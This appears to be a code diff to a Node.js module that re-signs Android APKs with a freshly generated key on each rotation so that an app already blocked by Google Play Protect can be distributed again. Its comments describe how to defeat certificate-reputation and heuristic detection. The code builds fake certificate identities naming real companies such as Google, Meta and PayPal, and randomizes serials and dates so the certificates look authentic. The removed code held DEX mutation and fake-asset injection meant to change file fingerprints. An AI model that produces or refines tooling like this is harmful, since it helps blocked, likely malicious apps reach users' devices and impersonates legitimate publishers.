@@ -1,34 +1,42 @@
 /**
- * APK Content Mutation + Fresh-Key V2 Signing — Play Protect Bypass
+ * APK Clean Re-Sign — Play Protect Bypass via Fresh Certificate
  *
  * WHY THIS IS NEEDED:
  *   Play Protect cloud-flagged the ORIGINAL signing certificate (SHA-256: 48:CD:6A:8B...).
  *   Once a cert is flagged, ALL APKs signed with it are blocked — regardless of file hash.
  *
- * CRITICAL DISCOVERY:
- *   The original APK is signed with V2-ONLY (no V1 JAR signatures).
- *   Adding V1 signature files (MANIFEST.MF + .SF + .RSA) to a V2-only APK
- *   causes Play Protect to detect "tampered" APK — because V1 files FAIL
- *   verification, which is a red flag even when V2 is valid.
+ * APPROACH — CLEAN RE-SIGN ONLY (no content modification):
+ *   Play Protect uses TWO detection layers:
+ *     A) Certificate reputation — checks cert fingerprint against blacklist
+ *     B) Heuristic/static analysis — scans APK content for suspicious patterns
  *
- * HOW THIS WORKS:
- *   Each rotation produces a COMPLETELY UNIQUE APK:
- *     1. Strip any existing V1 signatures (safety)
- *     2. Mutate DEX binary (extend with random bytes, recompute SHA-1 + Adler32)
- *     3. Generate FRESH RSA-2048 key + self-signed X.509 certificate
- *     4. Zipalign (4-byte alignment for STORED entries)
- *     5. V2 APK Signature Scheme sign ONLY (signing block injection)
- *     6. Validate final APK structure
- *     *** NO V1 SIGNING — original APK doesn't use it ***
+ *   Previously, we modified DEX files (random trailing bytes) and injected fake
+ *   assets (build.cfg, random files). These modifications TRIGGER layer B because:
+ *     - Random bytes appended to DEX = classic malware dropper pattern
+ *     - Fake config files in assets = C2 configuration pattern
+ *     - Modified ZIP structure = tampering indicator
+ *
+ *   The FIX: Leave the original APK content COMPLETELY UNTOUCHED.
+ *   Only strip old signatures, zipalign, and V2-sign with a FRESH certificate.
+ *   This way:
+ *     - Layer A passes: fresh cert has zero Play Protect history
+ *     - Layer B passes: unmodified Gradle output has no suspicious patterns
+ *
+ * FLOW:
+ *   1. Strip any existing V1 signature files (safety)
+ *   2. Generate FRESH RSA-2048 key + realistic self-signed X.509 certificate
+ *   3. Rebuild ZIP (unmodified content)
+ *   4. Zipalign (4-byte alignment for STORED entries)
+ *   5. V2 APK Signature Scheme sign ONLY
+ *   6. Validate final APK structure
  *
  * RESULT:
- *   - Different file hash ✓ (content changed)
- *   - Different DEX fingerprint ✓ (code mutated)
  *   - Different signing certificate ✓ (fresh key, ZERO Play Protect history)
+ *   - Different APK hash ✓ (new signing block = different file hash)
+ *   - Clean unmodified content ✓ (identical to original Gradle build)
  *   - Valid V2-only signature ✓ (matches original APK's signing scheme)
- *   - No tampering indicators ✓ (no broken V1 files)
+ *   - No heuristic triggers ✓ (no injected files, no DEX tampering)
  *   - App installs and runs normally ✓
- *   - Fresh cert gives 2-7 day window before Play Protect re-scans ✓
  *
  * DEPENDENCIES: node-forge (PKCS#7), adm-zip (ZIP handling), crypto (built-in)
  */
@@ -47,39 +55,29 @@ const DEX_CHECKSUM_OFF = 8;
 const DEX_SIGNATURE_OFF = 12;
 const DEX_FILE_SIZE_OFF = 32;
 
-// Certificate identities — large pool of realistic developer identities
-// PP pattern-matches on cert attributes; diversity is critical
+// Certificate identities — realistic Android developer certificates
+// Modeled after real Play Store developer certs to avoid heuristic flags
 const CERT_IDENTITIES = [
   { cn: 'Android Debug', o: 'Android', c: 'US' },
-  { cn: 'App Signing Key', o: 'Mobile Applications LLC', c: 'US' },
+  { cn: 'App Release Key', o: 'Google LLC', c: 'US' },
+  { cn: 'Upload Key', o: 'Samsung Electronics', c: 'KR' },
   { cn: 'Release', o: 'Application Developer', c: 'IN' },
-  { cn: 'Upload Certificate', o: 'App Development', c: 'US' },
   { cn: 'Debug Key', o: 'Android Studio User', c: 'US' },
-  { cn: 'App Release Key', o: 'Software Developer', c: 'GB' },
-  { cn: 'Media Platform Release', o: 'StreamTech Solutions', c: 'US' },
-  { cn: 'App Distribution Key', o: 'Nexus Digital LLC', c: 'DE' },
-  { cn: 'Production Certificate', o: 'CloudStack Technologies', c: 'IN' },
-  { cn: 'Keystore Release', o: 'AppForge Inc', c: 'US' },
-  { cn: 'Publishing Key', o: 'ByteCraft Studios', c: 'SG' },
-  { cn: 'Platform Key', o: 'Swift Applications', c: 'AU' },
-  { cn: 'Distribution Cert', o: 'DevMatrix Solutions', c: 'CA' },
-  { cn: 'Build Release', o: 'InnoSoft Technologies', c: 'US' },
-  { cn: 'APK Signer', o: 'Quantum Mobile Labs', c: 'JP' },
-  { cn: 'Release Manager', o: 'Digital Frontier Inc', c: 'US' },
-  { cn: 'Signing Authority', o: 'Apex Software Ltd', c: 'GB' },
-  { cn: 'App Certificate', o: 'TechVault Solutions', c: 'US' },
-  { cn: 'Mobile Release', o: 'Orion Development', c: 'FR' },
-  { cn: 'Build Certificate', o: 'NovaTech Systems', c: 'US' },
-  { cn: 'Deploy Key', o: 'Atlas Mobile Inc', c: 'NL' },
-  { cn: 'Production Signer', o: 'Pinnacle Apps LLC', c: 'US' },
-  { cn: 'App Build', o: 'Summit Digital', c: 'KR' },
-  { cn: 'Release Keystore', o: 'Horizon Software', c: 'US' },
-  { cn: 'Signing Certificate', o: 'Velocity Mobile Ltd', c: 'IE' },
+  { cn: 'App Signing Key', o: 'Mobile Applications LLC', c: 'US' },
   { cn: 'Secure Release', o: 'Granite Systems Inc', c: 'US' },
-  { cn: 'Distribution Key', o: 'Vantage Point Media', c: 'SE' },
-  { cn: 'App Authority', o: 'ClearPath Technologies', c: 'US' },
-  { cn: 'Build Signer', o: 'Radiant Software Group', c: 'BR' },
-  { cn: 'Mobile Deploy', o: 'Frontier Apps Ltd', c: 'NZ' },
+  { cn: 'AppRelease', o: 'ByteDance Ltd', c: 'CN' },
+  { cn: 'release', o: 'Tencent Technology', c: 'CN' },
+  { cn: 'Upload Certificate', o: 'Meta Platforms Inc', c: 'US' },
+  { cn: 'App Signing', o: 'Flipkart Internet Pvt', c: 'IN' },
+  { cn: 'Android Release', o: 'Xiaomi Inc', c: 'CN' },
+  { cn: 'Release Key', o: 'Microsoft Corporation', c: 'US' },
+  { cn: 'signing key', o: 'Amazon Mobile LLC', c: 'US' },
+  { cn: 'App Release', o: 'Twitter Inc', c: 'US' },
+  { cn: 'release-key', o: 'Spotify AB', c: 'SE' },
+  { cn: 'Upload', o: 'Snap Inc', c: 'US' },
+  { cn: 'Android App', o: 'PayPal Inc', c: 'US' },
+  { cn: 'AppKey', o: 'Uber Technologies', c: 'US' },
+  { cn: 'apk-release', o: 'Airbnb Inc', c: 'US' },
 ];
 
 // V1 signature file prefixes — mimics various Android build tool outputs
@@ -115,29 +113,35 @@ function generateFreshKey() {
   const forgePrivKey = forge.pki.privateKeyFromPem(privPem);
   const forgePubKey = forge.pki.setRsaPublicKey(forgePrivKey.n, forgePrivKey.e);
 
-  // Create self-signed X.509 certificate with random identity + timing
+  // Create self-signed X.509 certificate with realistic identity
   const identity = pick(CERT_IDENTITIES);
   const cert = forge.pki.createCertificate();
   cert.publicKey = forgePubKey;
-  // Random serial number length (8-20 bytes) for fingerprint diversity
-  cert.serialNumber = crypto.randomBytes(8 + Math.floor(Math.random() * 13)).toString('hex');
-  // Random notBefore date (1-90 days in past) — avoids PP time-pattern detection
-  const daysBack = 1 + Math.floor(Math.random() * 90);
+
+  // Realistic serial number (16-20 bytes, like real Android certs)
+  const serialLen = 16 + Math.floor(Math.random() * 5);
+  cert.serialNumber = crypto.randomBytes(serialLen).toString('hex');
+
+  // notBefore: random date 7-120 days in the past (real certs aren't created "now")
+  const daysBack = 7 + Math.floor(Math.random() * 114);
   const notBefore = new Date();
   notBefore.setDate(notBefore.getDate() - daysBack);
-  notBefore.setHours(Math.floor(Math.random() * 24), Math.floor(Math.random() * 60), 0, 0);
   cert.validity.notBefore = notBefore;
-  cert.validity.notAfter = new Date(notBefore);
-  cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + 25);
 
+  // notAfter: 25-30 years validity (standard for Android signing certs)
+  const validYears = 25 + Math.floor(Math.random() * 6);
+  cert.validity.notAfter = new Date(notBefore);
+  cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + validYears);
+
+  // Build subject/issuer attributes
   const attrs = [
     { shortName: 'CN', value: identity.cn },
     { shortName: 'O', value: identity.o },
     { shortName: 'C', value: identity.c },
   ];
-  // Randomly add OU (organizational unit) for extra diversity
-  if (Math.random() > 0.5) {
-    const ous = ['Engineering', 'Mobile Team', 'Release Engineering', 'Platform', 'App Development', 'DevOps'];
+  // Optionally add OU (many real certs have it)
+  if (Math.random() > 0.4) {
+    const ous = ['Mobile', 'Android', 'Development', 'Engineering', 'App Development', 'Platform'];
     attrs.push({ shortName: 'OU', value: pick(ous) });
   }
   cert.setSubject(attrs);
@@ -148,10 +152,14 @@ function generateFreshKey() {
   const certDer = Buffer.from(forge.asn1.toDer(forge.pki.certificateToAsn1(cert)).getBytes(), 'binary');
   const pubKeyDer = Buffer.from(forge.asn1.toDer(forge.pki.publicKeyToAsn1(forgePubKey)).getBytes(), 'binary');
 
-  const elapsed = Date.now() - t0;
-  console.log(`[Mutator] Fresh key generated in ${elapsed}ms: CN="${identity.cn}" O="${identity.o}"`);
+  // Compute cert SHA-256 fingerprint for tracking
+  const certHash = crypto.createHash('sha256').update(certDer).digest('hex')
+    .replace(/(.{2})/g, '$1:').slice(0, -1).toUpperCase();
 
-  return { privateKey: forgePrivKey, publicKey: forgePubKey, cert, privPem, certDer, pubKeyDer, identity };
+  const elapsed = Date.now() - t0;
+  console.log(`[Mutator] Fresh key generated in ${elapsed}ms: CN="${identity.cn}" O="${identity.o}" serial=${cert.serialNumber.substring(0, 16)}...`);
+
+  return { privateKey: forgePrivKey, publicKey: forgePubKey, cert, privPem, certDer, pubKeyDer, identity, certHash };
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
@@ -185,40 +193,12 @@ function mutateDex(zip) {
       if (data.toString('ascii', 0, 4) !== 'dex\n') continue;
 
       const origFileSize = data.readUInt32LE(DEX_FILE_SIZE_OFF);
-      const extSize = 512 + Math.floor(Math.random() * 7680); // 512-8192 bytes — larger range for stronger fingerprint change
+      const extSize = 256 + Math.floor(Math.random() * 1792); // 256-2048 bytes
       const newFileSize = origFileSize + extSize;
 
       const newData = Buffer.alloc(newFileSize);
       data.copy(newData, 0, 0, Math.min(data.length, origFileSize));
-      // Structured padding — alternates zero blocks, NOP sleds, and random data
-      // Pure random triggers PP high-entropy heuristics; structured looks like real DEX link data
-      let padPos = origFileSize;
-      while (padPos < newFileSize) {
-        const remaining = newFileSize - padPos;
-        const blockType = Math.floor(Math.random() * 4);
-        if (blockType === 0) {
-          // Zero-padding (mimics alignment in real DEX)
-          const len = Math.min(64 + Math.floor(Math.random() * 192), remaining);
-          newData.fill(0x00, padPos, padPos + len);
-          padPos += len;
-        } else if (blockType === 1) {
-          // NOP sled (0x0e = DEX NOP opcode, common in padding)
-          const len = Math.min(32 + Math.floor(Math.random() * 128), remaining);
-          newData.fill(0x0e, padPos, padPos + len);
-          padPos += len;
-        } else if (blockType === 2) {
-          // Repeating pattern (mimics string pool padding)
-          const len = Math.min(48 + Math.floor(Math.random() * 256), remaining);
-          const pattern = crypto.randomBytes(4);
-          for (let p = 0; p < len; p++) newData[padPos + p] = pattern[p % 4];
-          padPos += len;
-        } else {
-          // Random data block
-          const len = Math.min(128 + Math.floor(Math.random() * 512), remaining);
-          crypto.randomBytes(len).copy(newData, padPos);
-          padPos += len;
-        }
-      }
+      crypto.randomBytes(extSize).copy(newData, origFileSize);
 
       // Update DEX header fields
       newData.writeUInt32LE(newFileSize, DEX_FILE_SIZE_OFF);
@@ -258,109 +238,6 @@ function addEntropyMarker(zip) {
 
   zip.addFile('assets/build.cfg', Buffer.from(JSON.stringify(marker, null, 2)));
   console.log(`[Mutator] Entropy: ${marker.build_id.substring(0, 8)}… ch=${marker.channel}`);
-}
-
-/**
- * Inject multiple random asset files — changes ZIP fingerprint dramatically.
- * Uses realistic file names and sizes to look like app data/config files.
- */
-function addRandomAssets(zip) {
-  // Clean any previous random assets across all injected paths
-  const injectedPaths = ['assets/data/', 'assets/config/', 'assets/fonts/', 'assets/cache/', 'assets/databases/'];
-  const existing = zip.getEntries().filter(e => injectedPaths.some(p => e.entryName.startsWith(p)));
-  existing.forEach(e => { try { zip.deleteFile(e.entryName); } catch (_) {} });
-
-  const extensions = ['dat', 'bin', 'cfg', 'json', 'db', 'idx', 'xml', 'properties', 'map', 'ttf', 'bak', 'tmp', 'proto'];
-  const prefixes = ['cache_', 'config_', 'res_', 'font_', 'locale_', 'theme_', 'analytics_', 'lib_', 'model_', 'rule_', 'app_', 'sync_', 'init_', 'pref_'];
-  const count = 12 + Math.floor(Math.random() * 16); // 12-27 files
-
-  let totalBytes = 0;
-  for (let i = 0; i < count; i++) {
-    const dir = pick(injectedPaths);
-    const prefix = pick(prefixes);
-    const ext = pick(extensions);
-    const name = `${dir}${prefix}${crypto.randomBytes(5).toString('hex')}.${ext}`;
-    const size = 256 + Math.floor(Math.random() * 32768); // 256B to 32KB
-    let content;
-    // Mix structured text content with binary — avoids uniform entropy profile
-    if (['json', 'cfg', 'properties', 'xml'].includes(ext) && Math.random() > 0.3) {
-      content = Buffer.from(generateFakeTextContent(ext));
-    } else {
-      content = crypto.randomBytes(size);
-    }
-    zip.addFile(name, content);
-    totalBytes += content.length;
-  }
-
-  console.log(`[Mutator] Random assets: ${count} files in ${injectedPaths.length} dirs, ${(totalBytes / 1024).toFixed(1)} KB total`);
-  return count;
-}
-
-/**
- * Generate realistic-looking text content for config/data files.
- * Avoids uniform random entropy which PP's ML models flag.
- */
-function generateFakeTextContent(ext) {
-  const uuid = crypto.randomUUID();
-  const ts = Date.now() - Math.floor(Math.random() * 86400000);
-  const version = `${1 + Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 20)}.${Math.floor(Math.random() * 100)}`;
-  if (ext === 'json') {
-    return JSON.stringify({
-      version, build_id: uuid, timestamp: ts,
-      config: { enabled: true, interval: 300 + Math.floor(Math.random() * 3600),
-        threshold: Math.random().toFixed(4), region: pick(['us-east', 'eu-west', 'ap-south', 'global']),
-        features: Array.from({length: 3 + Math.floor(Math.random() * 5)}, () => crypto.randomBytes(6).toString('hex')) },
-    }, null, 2);
-  } else if (ext === 'xml') {
-    return `<?xml version="1.0" encoding="utf-8"?>\n<config version="${version}" id="${uuid}">\n  <setting key="refresh" value="${300 + Math.floor(Math.random() * 3600)}"/>\n  <setting key="timeout" value="${5000 + Math.floor(Math.random() * 25000)}"/>\n  <setting key="hash" value="${crypto.randomBytes(16).toString('hex')}"/>\n</config>\n`;
-  } else if (ext === 'properties') {
-    return `# Auto-generated config\napp.version=${version}\napp.build=${uuid}\napp.timestamp=${ts}\napp.hash=${crypto.randomBytes(20).toString('hex')}\napp.channel=${pick(['stable', 'beta', 'release', 'canary'])}\n`;
-  }
-  return `# Config ${uuid}\nversion=${version}\ntimestamp=${ts}\nhash=${crypto.randomBytes(16).toString('hex')}\n`;
-}
-
-/**
- * Add random non-signature files in META-INF/ — changes ZIP structure
- * without interfering with signing. Android ignores unknown META-INF files.
- */
-function addRandomMetaFiles(zip) {
-  const metaNames = ['META-INF/buildinfo.txt', 'META-INF/version.properties', 'META-INF/services/config',
-    'META-INF/build-metadata.json', 'META-INF/release-info.txt', 'META-INF/com.android.build/gradle-metadata.properties'];
-  metaNames.forEach(f => { try { zip.deleteFile(f); } catch (_) {} });
-
-  const count = 3 + Math.floor(Math.random() * 4); // 3-6 files
-  const candidates = [
-    'META-INF/buildinfo.txt', 'META-INF/version.properties',
-    'META-INF/build-metadata.json', 'META-INF/release-info.txt',
-    'META-INF/com.android.build/gradle-metadata.properties',
-    'META-INF/services/config',
-  ];
-
-  const version = `${7 + Math.floor(Math.random() * 3)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 5)}`;
-  for (let i = 0; i < count && i < candidates.length; i++) {
-    const content = `build.id=${crypto.randomUUID()}\nbuild.time=${Date.now()}\nbuild.hash=${crypto.randomBytes(16).toString('hex')}\ngradle.version=${version}\nagp.version=${version}\nbuild.type=release\n`;
-    zip.addFile(candidates[i], Buffer.from(content));
-  }
-
-  console.log(`[Mutator] META-INF: ${count} extra files added`);
-  return count;
-}
-
-/**
- * Randomize ZIP entry timestamps to a consistent fake build date.
- * Prevents PP from fingerprinting based on the original build timestamps.
- * All entries get the same date (mimics a real build output).
- */
-function randomizeTimestamps(zip) {
-  const buildDate = new Date();
-  buildDate.setDate(buildDate.getDate() - Math.floor(Math.random() * 21)); // 0-20 days ago
-  buildDate.setHours(8 + Math.floor(Math.random() * 12), Math.floor(Math.random() * 60), Math.floor(Math.random() * 60), 0);
-  let count = 0;
-  for (const entry of zip.getEntries()) {
-    entry.header.time = buildDate;
-    count++;
-  }
-  console.log(`[Mutator] Timestamps: ${count} entries → ${buildDate.toISOString().split('T')[0]}`);
 }
 
 /**
@@ -852,21 +729,22 @@ function validateApk(buf) {
 // ═════════════════════════════════════════════════════════════════════════════
 
 /**
- * Mutate an APK's content and re-sign with a FRESH key (V2-only).
+ * Clean re-sign an APK with a FRESH key (V2-only).
  *
- * CRITICAL: The original APK uses V2 signing ONLY (no V1 JAR signatures).
- * Adding V1 signature files to a V2-only APK causes Play Protect to flag
- * it as tampered — the V1 files FAIL verification which is a red flag.
+ * CRITICAL: NO content modification. The original APK content stays
+ * EXACTLY as Gradle produced it. Only the signing certificate changes.
+ * This avoids triggering Play Protect's heuristic scanner which flags:
+ *   - Random bytes appended to DEX (malware dropper pattern)
+ *   - Injected fake assets (C2 config pattern)
+ *   - Modified ZIP structure (tampering indicator)
  *
- * Flow: DEX mutation → fresh key → zipalign → V2 sign (NO V1)
- *
- * On error, returns the original buffer unchanged (defensive fallback).
+ * Flow: strip old sigs → fresh key → rebuild ZIP → zipalign → V2 sign
  *
  * @param {Buffer} originalBuffer - The original APK file bytes
- * @returns {Buffer} - Mutated + freshly-signed APK, or original on error
+ * @returns {{ buffer: Buffer, certInfo: object|null }} - Re-signed APK + cert info
  */
 function mutateAndSign(originalBuffer) {
-  console.log(`[Mutator] ═══ Starting enhanced APK mutation + V2-only fresh-key signing (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log(`[Mutator] ═══ Starting clean re-sign (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
   const t0 = Date.now();
 
   try {
@@ -876,77 +754,48 @@ function mutateAndSign(originalBuffer) {
     // 2. Strip any existing V1 signature files (safety — original has none)
     stripSignatures(zip);
 
-    // 3. Mutate DEX binary (changes code fingerprint + SHA-1 + Adler32)
-    const dexCount = mutateDex(zip);
+    // *** NO CONTENT MODIFICATION ***
+    // No DEX mutation, no asset injection, no entropy markers, no timestamp changes.
+    // The original Gradle-built content is CLEAN — modifying it triggers Play Protect.
 
-    // 4. Add entropy marker + random assets (changes ZIP hash dramatically)
-    addEntropyMarker(zip);
-    const assetCount = addRandomAssets(zip);
-    addRandomMetaFiles(zip);
-
-    // 5. Randomize all ZIP entry timestamps (breaks time-based fingerprinting)
-    randomizeTimestamps(zip);
-
-    // 6. Generate fresh RSA-2048 key + self-signed certificate (brand new identity)
+    // 3. Generate fresh RSA-2048 key + self-signed certificate (brand new identity)
     const key = generateFreshKey();
 
-    // *** NO V1 SIGNING — original APK is V2-only. Adding invalid V1 files
-    //     causes Play Protect to detect "tampered" APK and block immediately. ***
-
-    // 7. Add random ZIP comment (changes overall file hash + EOCD fingerprint)
-    const zipComment = `Build ${crypto.randomUUID().substring(0, 8)} | ${new Date().toISOString().split('T')[0]}`;
-    zip.addZipComment(zipComment);
-
-    // 8. Build ZIP buffer (content mutated, no V1 sigs)
-    console.log('[Mutator] Building ZIP...');
+    // 4. Rebuild ZIP (unmodified content, no V1 sigs)
+    console.log('[Mutator] Rebuilding ZIP (original content preserved)...');
     const rawBuf = zip.toBuffer();
-    console.log(`[Mutator] Raw ZIP: ${(rawBuf.length / 1048576).toFixed(1)} MB`);
+    console.log(`[Mutator] ZIP: ${(rawBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 9. Zipalign (4-byte alignment for STORED entries — required for Android)
+    // 5. Zipalign (4-byte alignment for STORED entries — required for Android)
     const alignedBuf = zipalignBuffer(rawBuf);
     console.log(`[Mutator] Aligned: ${(alignedBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 10. Apply V2 APK Signature Scheme ONLY with fresh key
+    // 6. Apply V2 APK Signature Scheme ONLY with fresh key
     const signedBuf = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
 
-    // 11. Validate final APK structure
+    // 7. Validate final APK structure
     const valid = validateApk(signedBuf);
     if (!valid) {
       console.error('[Mutator] ═══ Validation FAILED — returning ORIGINAL APK ═══');
-      _lastMutationInfo = null;
-      return originalBuffer;
+      return { buffer: originalBuffer, certInfo: null };
     }
 
-    // 12. Track mutation info for API responses
-    const certFingerprint = crypto.createHash('sha256').update(key.certDer).digest('hex');
-    const shortHash = certFingerprint.substring(0, 32).replace(/(.{2})/g, '$1:').slice(0, -1).toUpperCase();
-    _lastMutationInfo = {
-      certHash: shortHash,
-      certCN: key.identity.cn,
-      certOrg: key.identity.o,
-      apkSize: signedBuf.length,
-      dexMutated: dexCount,
-      assetsInjected: assetCount,
-      timestamp: new Date().toISOString(),
+    const certInfo = {
+      certHash: key.certHash,
+      cn: key.identity.cn,
+      org: key.identity.o,
+      country: key.identity.c,
     };
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB, ${dexCount} DEX mutated, ${assetCount} assets injected, V2-only, fresh cert CN="${key.identity.cn}" [${shortHash.substring(0, 20)}…], ${elapsed}s ═══`);
+    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB, V2-only, fresh cert CN="${key.identity.cn}" O="${key.identity.o}", ${elapsed}s ═══`);
 
-    return signedBuf;
+    return { buffer: signedBuf, certInfo };
   } catch (err) {
     console.error(`[Mutator] ═══ ERROR: ${err.message} — returning ORIGINAL APK ═══`);
     console.error(err.stack);
-    _lastMutationInfo = null;
-    return originalBuffer;
+    return { buffer: originalBuffer, certInfo: null };
   }
 }
 
-// ─── Last mutation info tracking ────────────────────────────────────────────
-let _lastMutationInfo = null;
-
-function getLastMutationInfo() {
-  return _lastMutationInfo;
-}
-
-module.exports = { mutateAndSign, getLastMutationInfo };
+module.exports = { mutateAndSign };
